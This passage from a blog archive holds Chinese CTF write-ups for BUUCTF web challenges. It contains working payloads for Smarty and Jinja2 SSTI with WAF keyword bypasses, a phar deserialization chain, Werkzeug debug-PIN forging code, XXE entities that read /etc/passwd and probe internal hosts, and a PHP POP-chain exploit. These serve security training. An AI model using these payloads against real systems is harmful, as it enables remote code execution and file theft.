9 9 0 61 25 25 0 61 49 49 0 61 31 31 0 61 60 60 0 61 24 24 0 61 45 45 0 61 61 61 0 61 再用php_mt_seed工具进行爆破 123456789┌──(kali㉿kali)-[~/Downloads/php_mt_seed-4.0]└─$ ./php_mt_seed 57 57 0 61 1 1 0 61 9 9 0 61 25 25 0 61 49 49 0 61 31 31 0 61 60 60 0 61 24 24 0 61 45 45 0 61 61 61 0 61Pattern: EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62 EXACT-FROM-62Version: 3.0.7 to 5.2.0Found 0, trying 0xfc000000 - 0xffffffff, speed 443.2 Mseeds/s Version: 5.2.1+Found 0, trying 0xfe000000 - 0xffffffff, speed 21.3 Mseeds/s Found 0# 没跑出来 用php_mt_seed破解出来的seed值，再重新来生成完整的20位字符串。 12345678910111213&lt;?php# 用了个值代替mt_srand(67413330);$str_long1 = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";$str = '';$len1 = 20;for ($i = 0; $i &lt; $len1; $i++) &#123; # 组成规则 # 从 $str_long1 字符串中 截取 $str .= substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);&#125;echo $str; 写了大致的解题过程，文本对不上，因为这个工具太不靠谱了，试了好几次，都解不出来。]]></content>
      <categories>
        <category>BUUCTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>代码审计</tag>
        <tag>PHP伪随机数的破解</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BUUCTF-WEB 【CISCN2019 华东南赛区】Web11 1]]></title>
    <url>%2F2021%2F04%2F21%2F%5BCISCN2019%20%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA%5DWeb11%201%2F</url>
    <content type="text"><![CDATA[考点：SSTI题以为这道题跟ikun那道题一样，考的知识点很多，是我想得复杂了。 分析 其实打开这张页面，我并不知道这道题是什么类型。只好先用bp去请求这两个接口。请求xff的时候，我添加了 xff头，值为127.0.0.1。回显了127.0.0.1。我就猜到是模板注入题了，加上页面上的关键字 Smarty，Smarty模板注入题，找了几个payload，没什么过滤，直接就回显了。 1&#123;$smarty.version&#125; 1&#123;system(&apos;cat /flag&apos;)&#125;]]></content>
      <categories>
        <category>BUUCTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>SSTI</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BUUCTF-WEB 【CISCN2019 华北赛区 Day1 Web1】Dropbox 1]]></title>
    <url>%2F2021%2F04%2F21%2F%5BCISCN2019%20%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA%20Day1%20Web1%5DDropbox%201%2F</url>
    <content type="text"><![CDATA[考点：文件下载、反序列化题：使用利用phar://在file_get_contents读取文件这个题照着别人wp做下来，还是有很多地方不懂，有点害怕审计代码，一连好几个文件，看来看去的，也看不太懂，很懵的感觉。这道题的后端操作，都抽象成了三个大类，保存在class.php文件中，在index.html、login.php这些页面，基本上就是包含了class.php 文件，很多操作就直接调用类方法，代码审计弱鸡的我自然看起来就费劲，不管怎样，还是总结下做题的流程。 分析经过注册、登录，上传文件。直接来第一个关键的地方。 经过一番操作后，发现存在文件下载漏洞，在点击下载功能后，进行抓包，会得到文件的内容，这里对index.php 进行了尝试，也直接得到了index.php 的源代码。 至于这里为什么要加 ../../ 两个回退。是因为在别人的wp中看到。 接下来，开始读取相关文件的源代码进行代码审计。 读取了6个文件的源代码，index.php 显示上传的文件，register.php 注册用户，login.php 登录，upload.php 文件上传，download.php 文件下载，delete.php 文件删除，class.php 为 基类，提供了三个大类，User、FileList、File 。其他的文件都是调用 class.php 里的方法，相当于把所有的方法都放在了class.php 的类中。 接下来贴几个关键的代码。 upload.php 12345678910111213141516171819202122232425262728293031323334353637383940414243444546session_start();if (!isset($_SESSION['login'])) &#123; header("Location: login.php"); die();&#125;include "class.php";if (isset($_FILES["file"])) &#123; $filename = $_FILES["file"]["name"]; $pos = strrpos($filename, "."); if ($pos !== false) &#123; $filename = substr($filename, 0, $pos); &#125; $fileext = ".gif"; switch ($_FILES["file"]["type"]) &#123; case 'image/gif': $fileext = ".gif"; break; case 'image/jpeg': $fileext = ".jpg"; break; case 'image/png': $fileext = ".png"; break; default: $response = array("success" =&gt; false, "error" =&gt; "Only gif/jpg/png allowed"); Header("Content-type: application/json"); echo json_encode($response); die(); &#125; if (strlen($filename) &lt; 40 &amp;&amp; strlen($filename) !== 0) &#123; $dst = $_SESSION['sandbox'] . $filename . $fileext; move_uploaded_file($_FILES["file"]["tmp_name"], $dst); $response = array("success" =&gt; true, "error" =&gt; ""); Header("Content-type: application/json"); echo json_encode($response); &#125; else &#123; $response = array("success" =&gt; false, "error" =&gt; "Invaild filename"); Header("Content-type: application/json"); echo json_encode($response); &#125;&#125;?&gt; download.php 12345678910111213141516171819202122232425&lt;?phpsession_start();if (!isset($_SESSION['login'])) &#123; header("Location: login.php"); die();&#125;if (!isset($_POST['filename'])) &#123; die();&#125;include "class.php";ini_set("open_basedir", getcwd() . ":/etc:/tmp"); // 值chdir($_SESSION['sandbox']);$file = new File();$filename = (string) $_POST['filename'];if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename) &amp;&amp; stristr($filename, "flag") === false) &#123; Header("Content-type: application/octet-stream"); Header("Content-Disposition: attachment; filename=" . basename($filename)); echo $file-&gt;close();&#125; else &#123; echo "File not exist";&#125;?&gt; delete.php 123456789101112131415161718192021222324252627&lt;?phpsession_start();if (!isset($_SESSION['login'])) &#123; header("Location: login.php"); die();&#125;if (!isset($_POST['filename'])) &#123; die();&#125;include "class.php";chdir($_SESSION['sandbox']);$file = new File();$filename = (string) $_POST['filename'];if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename)) &#123; $file-&gt;detele(); Header("Content-type: application/json"); $response = array("success" =&gt; true, "error" =&gt; ""); echo json_encode($response);&#125; else &#123; Header("Content-type: application/json"); $response = array("success" =&gt; false, "error" =&gt; "File not exist"); echo json_encode($response);&#125;?&gt; 最核心的 class.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143&lt;?phperror_reporting(0);$dbaddr = "127.0.0.1";$dbuser = "root";$dbpass = "root";$dbname = "dropbox";$db = new mysqli($dbaddr, $dbuser, $dbpass, $dbname);class User &#123; public $db; public function __construct() &#123; global $db; $this-&gt;db = $db; &#125; public function user_exist($username) &#123; $stmt = $this-&gt;db-&gt;prepare("SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;"); $stmt-&gt;bind_param("s", $username); $stmt-&gt;execute(); $stmt-&gt;store_result(); $count = $stmt-&gt;num_rows; if ($count === 0) &#123; return false; &#125; return true; &#125; public function add_user($username, $password) &#123; if ($this-&gt;user_exist($username)) &#123; return false; &#125; $password = sha1($password . "SiAchGHmFx"); $stmt = $this-&gt;db-&gt;prepare("INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);"); $stmt-&gt;bind_param("ss", $username, $password); $stmt-&gt;execute(); return true; &#125; public function verify_user($username, $password) &#123; if (!$this-&gt;user_exist($username)) &#123; return false; &#125; $password = sha1($password . "SiAchGHmFx"); $stmt = $this-&gt;db-&gt;prepare("SELECT `password` FROM `users` WHERE `username` = ?;"); $stmt-&gt;bind_param("s", $username); $stmt-&gt;execute(); $stmt-&gt;bind_result($expect); $stmt-&gt;fetch(); if (isset($expect) &amp;&amp; $expect === $password) &#123; return true; &#125; return false; &#125; public function __destruct() &#123; $this-&gt;db-&gt;close(); &#125;&#125;class FileList &#123; private $files; private $results; private $funcs; public function __construct($path) &#123; $this-&gt;files = array(); $this-&gt;results = array(); $this-&gt;funcs = array(); $filenames = scandir($path); $key = array_search(".", $filenames); unset($filenames[$key]); $key = array_search("..", $filenames); unset($filenames[$key]); foreach ($filenames as $filename) &#123; $file = new File(); $file-&gt;open($path . $filename); array_push($this-&gt;files, $file); $this-&gt;results[$file-&gt;name()] = array(); &#125; &#125; public function __call($func, $args) &#123; array_push($this-&gt;funcs, $func); foreach ($this-&gt;files as $file) &#123; $this-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func(); &#125; &#125; public function __destruct() &#123; $table = '&lt;div id="container" class="container"&gt;&lt;div class="table-responsive"&gt;&lt;table id="table" class="table table-bordered table-hover sm-font"&gt;'; $table .= '&lt;thead&gt;&lt;tr&gt;'; foreach ($this-&gt;funcs as $func) &#123; $table .= '&lt;th scope="col" class="text-center"&gt;' . htmlentities($func) . '&lt;/th&gt;'; &#125; $table .= '&lt;th scope="col" class="text-center"&gt;Opt&lt;/th&gt;'; $table .= '&lt;/thead&gt;&lt;tbody&gt;'; foreach ($this-&gt;results as $filename =&gt; $result) &#123; $table .= '&lt;tr&gt;'; foreach ($result as $func =&gt; $value) &#123; $table .= '&lt;td class="text-center"&gt;' . htmlentities($value) . '&lt;/td&gt;'; &#125; $table .= '&lt;td class="text-center" filename="' . htmlentities($filename) . '"&gt;&lt;a href="#" class="download"&gt;下载&lt;/a&gt; / &lt;a href="#" class="delete"&gt;删除&lt;/a&gt;&lt;/td&gt;'; $table .= '&lt;/tr&gt;'; &#125; echo $table; &#125;&#125;class File &#123; public $filename; public function open($filename) &#123; $this-&gt;filename = $filename; if (file_exists($filename) &amp;&amp; !is_dir($filename)) &#123; return true; &#125; else &#123; return false; &#125; &#125; public function name() &#123; return basename($this-&gt;filename); &#125; public function size() &#123; $size = filesize($this-&gt;filename); $units = array(' B', ' KB', ' MB', ' GB', ' TB'); for ($i = 0; $size &gt;= 1024 &amp;&amp; $i &lt; 4; $i++) $size /= 1024; return round($size, 2).$units[$i]; &#125; public function detele() &#123; unlink($this-&gt;filename); &#125; public function close() &#123; return file_get_contents($this-&gt;filename); &#125;&#125;?&gt; 就是上面这些看起来费劲，理解不了。 这里就直接贴 制作phar 代码。 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?phpclass User&#123; public $db; public function __construct() &#123; $this-&gt;db = new FileList(); &#125;&#125;class FileList&#123; private $files; private $results; private $funcs; public function __construct() &#123; $this-&gt;files = array(new File()); $this-&gt;results = array(); $this-&gt;funcs = array(); &#125;&#125;class File&#123; public $filename = '/flag.txt';&#125;$user = new User();@unlink("test.phar");$phar = new Phar("test.phar");$phar-&gt;startBuffering();# 设置stub$phar-&gt;setStub("GIF98a&lt;?php __HALT_COMPILER(); ?&gt;");$phar-&gt;setMetadata($user);# 添加要压缩的文件及内容$phar-&gt;addFromString('test.txt', "test");# 签名自动计算$phar-&gt;stopBuffering(); 把生成的 test.phar 改成 test.gif ，然后上传 成功后 抓删除的包 1phar://test.gif phar:// 协议在读取 phar文件时，会有进行反序列化的操作，当我们把序列化的内容放在setMetadata 中，再用phar:// 协议去读取，就会反序列化里面的内容。 在file_get_contents 函数中 用 phar:// 读取 phar文件 的演示这是仿照别人wp构造的两个类，然后用file_get_contents 来读取 自己制作的phar文件 demo1.php 12345678910111213141516171819202122232425&lt;!-- 使用phar://进行反序列序列化-3--&gt;&lt;?phpclass Demo1&#123; public $sub; public function __construct($sub) &#123; $this-&gt;sub = $sub; &#125;&#125;class Demo2&#123; public $s; public function __construct($s) &#123; $this-&gt;s = $s; &#125; public function __destruct() &#123; // TODO: Implement __destruct() method. eval($this-&gt;s); &#125;&#125;file_get_contents('phar://demo1.phar');?&gt; demo2.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;!-- 使用phar://进行反序列序列化-2--&gt;&lt;?phpclass Demo1&#123; public $sub; public function __construct() &#123; $this-&gt;sub = new Demo2('phpinfo();'); &#125;&#125;class Demo2&#123; public $s; public function __construct($s) &#123; $this-&gt;s = $s; &#125; public function __destruct() &#123; // TODO: Implement __destruct() method. eval($this-&gt;s); &#125;&#125;$user = new Demo1();@unlink("demo1.phar");$phar = new Phar("demo1.phar");$phar-&gt;startBuffering();# 设置stub$phar-&gt;setStub("GIF98a&lt;?php __HALT_COMPILER(); ?&gt;");$phar-&gt;setMetadata($user);# 添加要压缩的文件及内容$phar-&gt;addFromString('test.txt', "test");# 签名自动计算$phar-&gt;stopBuffering();?&gt; 执行demo1 的时候会输出]]></content>
      <categories>
        <category>BUUCTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BUUCTF-WEB 【GYCTF2020】FlaskApp 1]]></title>
    <url>%2F2021%2F04%2F19%2F%5BGYCTF2020%5DFlaskApp%201%2F</url>
    <content type="text"><![CDATA[SSIT题第一种方式：绕过waf读取保存flag的文件读取app.py源代码的payload 12345&#123;% for c in [].__class__.__base__.__subclasses__() %&#125; &#123;% if c.__name__==&apos;catch_warnings&apos; %&#125; &#123;&#123; c.__init__.__globals__[&apos;__builtins__&apos;].open(&apos;app.py&apos;,&apos;r&apos;).read() &#125;&#125; &#123;% endif %&#125;&#123;% endfor %&#125; 1&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&apos;catch_warnings&apos; %&#125;&#123;&#123; c.__init__.__globals__[&apos;__builtins__&apos;].open(&apos;app.py&apos;,&apos;r&apos;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667from flask import Flask,render_template_string from flask import render_template,request,flash,redirect,url_for from flask_wtf import FlaskForm from wtforms import StringField, SubmitField from wtforms.validators import DataRequired from flask_bootstrap import Bootstrap import base64 app = Flask(__name__) app.config[&amp;#39;SECRET_KEY&amp;#39;] = &amp;#39;s_e_c_r_e_t_k_e_y&amp;#39; bootstrap = Bootstrap(app) class NameForm(FlaskForm): text = StringField(&amp;#39;BASE64加密&amp;#39;,validators= [DataRequired()]) submit = SubmitField(&amp;#39;提交&amp;#39;) class NameForm1(FlaskForm): text = StringField(&amp;#39;BASE64解密&amp;#39;,validators= [DataRequired()]) submit = SubmitField(&amp;#39;提交&amp;#39;) def waf(str): black_list = [&amp;#34;flag&amp;#34;,&amp;#34;os&amp;#34;,&amp;#34;system&amp;#34;,&amp;#34;popen&amp;#34;,&amp;#34;import&amp;#34;,&amp;#34;eval&amp;#34;,&amp;#34;chr&amp;#34;,&amp;#34;request&amp;#34;, &amp;#34;subprocess&amp;#34;,&amp;#34;commands&amp;#34;,&amp;#34;socket&amp;#34;,&amp;#34;hex&amp;#34;,&amp;#34;base64&amp;#34;,&amp;#34;*&amp;#34;,&amp;#34;?&amp;#34;] for x in black_list : if x in str.lower() : return 1 @app.route(&amp;#39;/hint&amp;#39;,methods=[&amp;#39;GET&amp;#39;]) def hint(): txt = &amp;#34;失败乃成功之母！！&amp;#34; return render_template(&amp;#34;hint.html&amp;#34;,txt = txt) @app.route(&amp;#39;/&amp;#39;,methods=[&amp;#39;POST&amp;#39;,&amp;#39;GET&amp;#39;]) def encode(): if request.values.get(&amp;#39;text&amp;#39;) : text = request.values.get(&amp;#34;text&amp;#34;) text_decode = base64.b64encode(text.encode()) tmp = &amp;#34;结果 :&#123;0&#125;&amp;#34;.format(str(text_decode.decode())) res = render_template_string(tmp) flash(tmp) return redirect(url_for(&amp;#39;encode&amp;#39;)) else : text = &amp;#34;&amp;#34; form = NameForm(text) return render_template(&amp;#34;index.html&amp;#34;,form = form ,method = &amp;#34;加密&amp;#34; ,img = &amp;#34;flask.png&amp;#34;) @app.route(&amp;#39;/decode&amp;#39;,methods=[&amp;#39;POST&amp;#39;,&amp;#39;GET&amp;#39;]) def decode(): if request.values.get(&amp;#39;text&amp;#39;) : text = request.values.get(&amp;#34;text&amp;#34;) text_decode = base64.b64decode(text.encode()) tmp = &amp;#34;结果 ： &#123;0&#125;&amp;#34;.format(text_decode.decode()) if waf(tmp) : flash(&amp;#34;no no no !!&amp;#34;) return redirect(url_for(&amp;#39;decode&amp;#39;)) res = render_template_string(tmp) flash( res ) return redirect(url_for(&amp;#39;decode&amp;#39;)) else : text = &amp;#34;&amp;#34; form = NameForm1(text) return render_template(&amp;#34;index.html&amp;#34;,form = form, method = &amp;#34;解密&amp;#34; , img = &amp;#34;flask1.png&amp;#34;) @app.route(&amp;#39;/&amp;lt;name&amp;gt;&amp;#39;,methods=[&amp;#39;GET&amp;#39;]) def not_found(name): return render_template(&amp;#34;404.html&amp;#34;,name = name) if __name__ == &amp;#39;__main__&amp;#39;: app.run(host=&amp;#34;0.0.0.0&amp;#34;, port=5000, debug=True)# html 解码from flask import Flask,render_template_string from flask import render_template,request,flash,redirect,url_for from flask_wtf import FlaskForm from wtforms import StringField, SubmitField from wtforms.validators import DataRequired from flask_bootstrap import Bootstrap import base64 app = Flask(__name__) app.config['SECRET_KEY'] = 's_e_c_r_e_t_k_e_y' bootstrap = Bootstrap(app) class NameForm(FlaskForm): text = StringField('BASE64 Æ',validators= [DataRequired()]) submit = SubmitField('Ð¤') class NameForm1(FlaskForm): text = StringField('BASE64ãÆ',validators= [DataRequired()]) submit = SubmitField('Ð¤') def waf(str): black_list = ["flag","os","system","popen","import","eval","chr","request", "subprocess","commands","socket","hex","base64","*","?"] for x in black_list : if x in str.lower() : return 1 @app.route('/hint',methods=['GET']) def hint(): txt = "1%CKÍ" return render_template("hint.html",txt = txt) @app.route('/',methods=['POST','GET']) def encode(): if request.values.get('text') : text = request.values.get("text") text_decode = base64.b64encode(text.encode()) tmp = "Ó :&#123;0&#125;".format(str(text_decode.decode())) res = render_template_string(tmp) flash(tmp) return redirect(url_for('encode')) else : text = "" form = NameForm(text) return render_template("index.html",form = form ,method = " Æ" ,img = "flask.png") @app.route('/decode',methods=['POST','GET']) def decode(): if request.values.get('text') : text = request.values.get("text") text_decode = base64.b64decode(text.encode()) tmp = "Ó  &#123;0&#125;".format(text_decode.decode()) if waf(tmp) : flash("no no no !!") return redirect(url_for('decode')) res = render_template_string(tmp) flash( res ) return redirect(url_for('decode')) else : text = "" form = NameForm1(text) return render_template("index.html",form = form, method = "ãÆ" , img = "flask1.png") @app.route('/&lt;name&gt;',methods=['GET']) def not_found(name): return render_template("404.html",name = name) if __name__ == '__main__': app.run(host="0.0.0.0", port=5000, debug=True) waf 过滤了 [&quot;flag&quot;,&quot;os&quot;,&quot;system&quot;,&quot;popen&quot;,&quot;import&quot;,&quot;eval&quot;,&quot;chr&quot;,&quot;request&quot;, &quot;subprocess&quot;,&quot;commands&quot;,&quot;socket&quot;,&quot;hex&quot;,&quot;base64&quot;,&quot;*&quot;,&quot;?&quot;] 关键字 查看根目录下所有文件 12345&#123;% for c in [].__class__.__base__.__subclasses__() %&#125; &#123;% if c.__name__==&apos;catch_warnings&apos; %&#125; &#123;&#123; c.__init__.__globals__[&apos;__builtins__&apos;][&apos;__imp&apos;+&apos;ort__&apos;](&apos;o&apos;+&apos;s&apos;).listdir(&apos;/&apos;)&#125;&#125; &#123;% endif %&#125;&#123;% endfor %&#125; 1&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&apos;catch_warnings&apos; %&#125;&#123;&#123; c.__init__.__globals__[&apos;__builtins__&apos;][&apos;__imp&apos;+&apos;ort__&apos;](&apos;o&apos;+&apos;s&apos;).listdir(&apos;/&apos;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; 拼接的方式绕过waf 123[&amp;#39;bin&amp;#39;, &amp;#39;boot&amp;#39;, &amp;#39;dev&amp;#39;, &amp;#39;etc&amp;#39;, &amp;#39;home&amp;#39;, &amp;#39;lib&amp;#39;, &amp;#39;lib64&amp;#39;, &amp;#39;media&amp;#39;, &amp;#39;mnt&amp;#39;, &amp;#39;opt&amp;#39;, &amp;#39;proc&amp;#39;, &amp;#39;root&amp;#39;, &amp;#39;run&amp;#39;, &amp;#39;sbin&amp;#39;, &amp;#39;srv&amp;#39;, &amp;#39;sys&amp;#39;, &amp;#39;tmp&amp;#39;, &amp;#39;usr&amp;#39;, &amp;#39;var&amp;#39;, &amp;#39;this_is_the_flag.txt&amp;#39;, &amp;#39;.dockerenv&amp;#39;, &amp;#39;app&amp;#39;] # html解码 [&apos;bin&apos;, &apos;boot&apos;, &apos;dev&apos;, &apos;etc&apos;, &apos;home&apos;, &apos;lib&apos;, &apos;lib64&apos;, &apos;media&apos;, &apos;mnt&apos;, &apos;opt&apos;, &apos;proc&apos;, &apos;root&apos;, &apos;run&apos;, &apos;sbin&apos;, &apos;srv&apos;, &apos;sys&apos;, &apos;tmp&apos;, &apos;usr&apos;, &apos;var&apos;, &apos;this_is_the_flag.txt&apos;, &apos;.dockerenv&apos;, &apos;app&apos;] 读取this_is_the_flag.txt 文件 12345&#123;% for c in [].__class__.__base__.__subclasses__() %&#125; &#123;% if c.__name__==&apos;catch_warnings&apos; %&#125; &#123;&#123; c.__init__.__globals__[&apos;__builtins__&apos;].open(&apos;/this_is_the_fl&apos;+&apos;ag.txt&apos;,&apos;r&apos;).read()&#125;&#125; &#123;% endif %&#125;&#123;% endfor %&#125; 1&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&apos;catch_warnings&apos; %&#125;&#123;&#123; c.__init__.__globals__[&apos;__builtins__&apos;].open(&apos;/this_is_the_fl&apos;+&apos;ag.txt&apos;,&apos;r&apos;).read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; 第二方式：通过计算PIN码进入shell中执行命令计算PIN码的6个数据 1、运行app的用户名，/etc/passwd ​ 得到 flaskweb 2、module name 一般固定位flask.app 3、getattr(app, &quot;__name__&quot;, app.__class__.__name__)的结果。就是Flask 4、flask库下app.py的绝对路径，不是当前运行的app.py的路径，在debug模式下报错就能直接看见。 /usr/local/lib/python3.7/site-packages/flask/app.py 5、当前网络的mac地址的十进制数。通过文件 /sys/class/net/eth0/address 读取， 02:42:ac:10:ab:40 转成10进制 2485377870656 6、机器的id 对于非docker机每一个机器都会有自已唯一的id，linux的id一般存放在/etc/machine-id或/proc/sys/kernel/random/boot_i，有的系统没有这两个文件，windows的id获取跟linux也不同。对于docker机则读取/proc/self/cgroup，序列号为1那行 1:name=systemd:/docker/8c9b58ed756803d15052dd5f7dc35d106e48f5dbe629ebb1d5494a9f384355af 0::/system.slice/containerd.service 计算PIN的模板 1234567891011121314151617181920212223242526272829303132333435363738394041import hashlibfrom itertools import chainprobably_public_bits = [ '运行app用户名', 'module name ', 'Flask', 'flask库下app.py的绝对路径',]private_bits = [ '当前网络的mac地址的十进制数', '机器的id']h = hashlib.md5()for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode('utf-8') h.update(bit)h.update(b'cookiesalt')cookie_name = '__wzd' + h.hexdigest()[:20]num = Noneif num is None: h.update(b'pinsalt') num = ('%09d' % int(h.hexdigest(), 16))[:9]rv =Noneif rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = '-'.join(num[x:x + group_size].rjust(group_size, '0') for x in range(0, len(num), group_size)) break else: rv = numprint(rv) 1234567891011121314151617181920212223242526272829303132333435363738394041import hashlibfrom itertools import chainprobably_public_bits = [ 'flaskweb', 'flask.app', 'Flask', '/usr/local/lib/python3.7/site-packages/flask/app.py',]private_bits = [ '2485377870656', '8c9b58ed756803d15052dd5f7dc35d106e48f5dbe629ebb1d5494a9f384355af']h = hashlib.md5()for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode('utf-8') h.update(bit)h.update(b'cookiesalt')cookie_name = '__wzd' + h.hexdigest()[:20]num = Noneif num is None: h.update(b'pinsalt') num = ('%09d' % int(h.hexdigest(), 16))[:9]rv =Noneif rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = '-'.join(num[x:x + group_size].rjust(group_size, '0') for x in range(0, len(num), group_size)) break else: rv = numprint(rv) 得到 243-909-803 在shell 中 执行，就能拿到flag 123import osos.popen(&quot;ls -l /&quot;).read()os.popen(&quot;cat /this_is_the_flag.txt&quot;).read()]]></content>
      <categories>
        <category>BUUCTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>SSTI(jinja2)</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BUUCTF-WEB 【NCTF2019】True XML cookbook 1]]></title>
    <url>%2F2021%2F04%2F18%2F%5BNCTF2019%5DTrue%20XML%20cookbook%201%2F</url>
    <content type="text"><![CDATA[考点：XXE扫内网题读取/etc/passwd 12345&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;!DOCTYPE a[&lt;!ENTITY name SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;user&gt;&lt;username&gt;&amp;name;&lt;/username&gt;&lt;password&gt;1&lt;/password&gt;&lt;/user&gt; 读取/flag 会报错，因为没有这个文件 XXE扫内网 读取 /etc/hosts 和 /proc/net/arp 12345&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;!DOCTYPE a[ &lt;!ENTITY name SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;&lt;user&gt;&lt;username&gt;&amp;name;&lt;/username&gt;&lt;password&gt;1&lt;/password&gt;&lt;/user&gt; 12345&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;!DOCTYPE a[ &lt;!ENTITY name SYSTEM &quot;file:///proc/net/arp&quot; &gt;]&gt;&lt;user&gt;&lt;username&gt;&amp;name;&lt;/username&gt;&lt;password&gt;1&lt;/password&gt;&lt;/user&gt; 还真不少，用http://请求看看。 12345&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;!DOCTYPE a[ &lt;!ENTITY name SYSTEM &quot;http://10.0.196.1&quot; &gt;]&gt;&lt;user&gt;&lt;username&gt;&amp;name;&lt;/username&gt;&lt;password&gt;1&lt;/password&gt;&lt;/user&gt; 放入intruder 跑 在10.0.196.11 下找到 这道题完全是看wp做的，xxe的题做得少，只要稍微报错一点，就看不懂，xxe，外部实体注入，就是从外部引入xml格式的文件或语句到服务端执行。]]></content>
      <categories>
        <category>BUUCTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>XXE</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BUUCTF-WEB 【MRCTF2020】Ezpop 1]]></title>
    <url>%2F2021%2F04%2F18%2F%5BMRCTF2020%5DEzpop%201%2F</url>
    <content type="text"><![CDATA[反序列化题：POP链构造123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263Welcome to index.php&lt;?php//flag is in flag.php//WTF IS THIS?//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95//And Crack It!class Modifier &#123; protected $var; public function append($value)&#123; include($value); &#125; # pop构造链 一般是从 可利用的地方 回溯到 可控制的地方 # 1. 可以看到 当前类有一个魔法方法 __invoke 当这个类 以调用函数的方式调用时 就会触发该方法 我们看看那个类的方法可以调用类 public function __invoke()&#123; $this-&gt;append($this-&gt;var); &#125;&#125;#class Show&#123; public $source; public $str; public function __construct($file='index.php')&#123; $this-&gt;source = $file; echo 'Welcome to '.$this-&gt;source."&lt;br&gt;"; &#125; public function __toString()&#123; # 4. Show类 的 __toString 方法 会返回一个 $this-&gt;str-&gt;source # 可以把$this-&gt;str 属性 赋值成 Test类，这样就相当于，$this-&gt;str-&gt;source Test-&gt;source 也就相当于调用了一个不存在的属性 return $this-&gt;str-&gt;source; &#125; public function __wakeup()&#123; if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this-&gt;source)) &#123; echo "hacker"; $this-&gt;source = "index.php"; &#125; &#125;&#125;class Test&#123; public $p; public function __construct()&#123; $this-&gt;p = array(); &#125; # # 3. __get 这个魔法方法要怎么被调用呢 答案是 获取一个不存在的属性或者私有属性 public function __get($key)&#123; $function = $this-&gt;p; # 2. 发现在Test 类中可以调用一个自定义函数 用构造方法来创建一个类 return $function(); &#125;&#125;if(isset($_GET['pop']))&#123; @unserialize($_GET['pop']);&#125;else&#123; $a=new Show; highlight_file(__FILE__);&#125; 分析在Modifier 类中发现include 函数，可以通过php://filter 去读取flag.php源代码。 最终我们要通过Modifier 的 append方法去包含flag.php的源代码。在Modifier 类中找到一个魔法方法__invoke() ，这个类能控制 append 方法，触发__invoke() 这个魔法方法的方式是以调用函数的方式去调用类。而在Test类中，存在一个__get 的魔法方法，有一条语句，return $function(); 并且$function可控制。而__get 触发方式是 调用一个不存在的属性或者私有属性 时，就会触发该方法。而在Show 类中存在__toString的魔法方法，return $this-&gt;str-&gt;source; 的$this-&gt;str可控制。 构造如下 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;?phpclass Modifier &#123; protected $var="php://filter/read=convert.base64-encode/resource=flag.php"; public function append($value)&#123; include($value); &#125; public function __invoke()&#123; $this-&gt;append($this-&gt;var); &#125;&#125;#class Show&#123; public $source; public $str; public function __construct($file='index.php')&#123; $this-&gt;str = new Test(); $this-&gt;source = $file; echo 'Welcome to '.$this-&gt;source."&lt;br&gt;"; &#125; public function __toString()&#123; return $this-&gt;str-&gt;source.""; &#125; public function __wakeup()&#123; if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this-&gt;source)) &#123; echo "hacker"; $this-&gt;source = "index.php"; &#125; &#125;&#125;class Test&#123; public $p; public function __construct()&#123; $this-&gt;p = new Modifier(); &#125; public function __get($key)&#123; $function = $this-&gt;p; return $function(); &#125;&#125;$s1 = new Show();$s1 = new Show($s1);var_dump(urlencode(serialize($s1))); 得到 